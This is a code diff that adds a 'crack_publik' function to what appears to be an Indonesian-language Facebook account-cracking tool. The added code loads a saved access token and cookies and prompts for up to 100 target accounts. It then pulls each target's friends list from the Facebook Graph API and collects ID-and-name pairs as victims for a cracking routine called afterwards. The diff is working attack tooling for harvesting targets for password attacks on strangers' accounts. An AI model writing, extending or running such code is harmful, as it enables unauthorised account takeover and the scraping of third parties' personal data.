@@ -755,6 +755,56 @@ def publikv2():
         except Exception as e:
             print(e)
 
+
+#----------[ CRACK-PUBLIK  ]----------#            
+def crack_publik():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+    except IOError:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        exit(f"{kun}└──[{mer} Cokies Expired ")           
+    try:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        kumpulkan = int(input(f'{kun}└──[{puti} Berapa target : '))
+    except ValueError:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        exit(f"{kun}└──[{mer} Yang bener :-( ")    
+    if kumpulkan<1 or kumpulkan>100:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        exit(f"{kun}└──[{mer} Gagal Dump ")    
+    ses=requests.Session()
+    bilangan = 0
+    for KOTG49H in range(kumpulkan):
+        bilangan+=1
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' {hijo}: ')
+        uid.append(Masukan)
+    for user in uid:
+        try:
+            graph = ses.get('https://graph.facebook.com/v17.0/'+user+'?fields=friends.limit(999999999)&access_token='+tokenmu[0], cookies = {'cookies':cok}).json()
+            for xr in graph['friends']['data']:
+                try:
+                    gmail = (xr['id']+'|'+xr['name'])
+                    if gmail in id:pass
+                    else:id.append(gmail)
+                except:continue
+        except (KeyError,IOError):
+            pass
+        except requests.exceptions.ConnectionError:
+            print(f"{kun}╭────────────────────────────────────────────{puti}")
+            exit(f"{kun}└──[{mer} Koneksi Problem ")
+    try:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        print(f'{kun}└──[{puti} Total target {hijo}: '+str(len(id)))
+        setting()
+    except requests.exceptions.ConnectionError:
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        exit(f"{kun}└──[{mer} Gagal Dump ")
+    except (KeyError,IOError):
+        print(f"{kun}╭────────────────────────────────────────────{puti}")
+        exit(f"{kun}└──[{mer} Tidak punya teman ")
+	      
 #-------------------[ CRACK-PUBLIK ]----------------#
 def publik():
     with requests.Session() as ses:
